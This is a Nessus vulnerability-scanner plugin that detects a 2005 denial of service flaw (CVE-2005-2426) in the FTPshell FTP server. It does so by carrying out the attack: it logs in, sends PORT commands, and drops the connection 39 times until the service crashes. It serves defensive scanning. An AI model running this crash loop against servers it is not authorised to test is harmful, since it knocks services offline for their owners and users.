#
# (C) Tenable Network Security
#


if (description) {
  script_id(19303);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2426");
  script_bugtraq_id(14382);

  name["english"] = "FTPshell 3.38 Denial of Service Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote FTP service is affected by a denial of service vulnerability. 

Description :

The remote host is using FTPshell, an FTP service for Windows. 

The version of FTPshell installed on the remote host suffers from a
denial of service vulnerability that can be exploited by logging into
the service, sending a PORT command, and closing the connection without
QUITing, all 39 times. 

See also : 

http://reedarvin.thearvins.com/20050725-01.html
http://archives.neohapsis.com/archives/fulldisclosure/2005-07/0558.html

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 1
(AV:R/AC:L/Au:R/C:N/A:P/I:N/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for denial of service vulnerability in FTPshell 3.38";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/false_ftp", "ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# If it's for FTPshell...
banner = get_ftp_banner(port:port);
if (
  banner &&  
  egrep(string:banner, pattern:"^220[ -] FTPshell Server Service")
) {
  # nb: to exploit the vulnerability we need to log in.
  user = get_kb_item("ftp/login");
  pass = get_kb_item("ftp/password");
  if (!user || !pass) {
    if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty; skipped!", level:0);
    exit(0);
  }

  # Try to exploit the flaw.
  #
  # nb: we iterate one extra time to check if the service has crashed.
  max = 40;
  for (i=1; i<=max; i++) {
    soc = open_sock_tcp(port);

    # If we could open a socket...
    if (soc) {
      # nb: this sleep doesn't seem necessary but exists in the PoC.
      # sleep(1);
      if (ftp_authenticate(socket:soc, user:user, pass:pass)) {
        # nb: there seems to be a timing issue as without this
        #     sleep the DoS doesn't work.
        sleep(1);

        # Send a PORT command.
        c = string("PORT 127,0,0,1,18,12");
        send(socket:soc, data:string(c, "\r\n"));
        s = ftp_recv_line(socket:soc);

        if (s) {
          # nb: this sleep doesn't seem necessary but exists in the PoC.
          # sleep(1);

          # Close the socket (don't QUIT).
          close(soc);
        }
      }
      else if (i == 1) {
        if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials; skipped!", level:0);
        close(soc);
        exit(1);
      }
    }
    # If we couldn't open a socket after at least 1 iteration, there's a problem.
    else if (i > 1) {
      security_note(port);
      exit(0);
    }
  }
}
